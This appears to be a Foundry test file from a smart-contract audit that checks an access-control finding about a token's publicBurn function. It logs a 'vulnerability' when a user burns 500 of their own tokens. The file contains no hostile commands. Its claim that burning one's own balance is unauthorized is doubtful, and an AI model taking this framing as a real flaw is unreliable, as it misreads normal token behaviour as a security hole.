// SPDX-License-Identifier: MIT
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SCCS.sol";

contract SCCSAccessControlTest is Test {
    SCCS public token;
    address owner = address(0x1);
    address user = address(0x2);
    
    function setUp() public {
        vm.startPrank(owner);
        token = new SCCS();
        // Transfer tokens to user with correct decimal calculation
        token.transfer(user, 1000 ether); // 1000 * 10^18 tokens
        vm.stopPrank();
    }

    function testPublicBurnLackOfAccessControl() public {
        uint256 burnAmount = 500 ether; // 500 * 10^18 tokens

        // --- BEFORE-Trigger State ---
        console.log("--- BEFORE-Trigger Burn ---");
        uint256 userBalanceBefore = token.balanceOf(user);
        console.log("User balance before burn: %s", userBalanceBefore);

        // --- Trigger Attack Operation ---
        console.log("--- Trigger publicBurn attack ---");
        vm.startPrank(user);
        token.publicBurn(burnAmount);
        vm.stopPrank();

        // --- AFTER-Trigger State ---
        console.log("--- AFTER-Trigger Burn ---");
        uint256 userBalanceAfter = token.balanceOf(user);
        console.log("User balance after burn: %s", userBalanceAfter);

        // --- Differential Validation ---
        console.log("--- Validation Result ---");
        uint256 burnedAmount = userBalanceBefore - userBalanceAfter;
        console.log("Burned amount: %s", burnedAmount);
        console.log("Expected burn amount: %s", burnAmount);

        if (burnedAmount == burnAmount) {
            console.log("Vulnerability Exists: User successfully burned tokens without authorization");
        } else {
            console.log("Vulnerability not Exist: Burn operation failed or amount differs from expected");
        }

        // Complete cleanup burn (preserve original test behavior)
        uint256 finalBalance = token.balanceOf(user);
        vm.prank(user);
        token.publicBurn(finalBalance);
        assertEq(token.balanceOf(user), 0, "Full token burn unsuccessful");
    }
}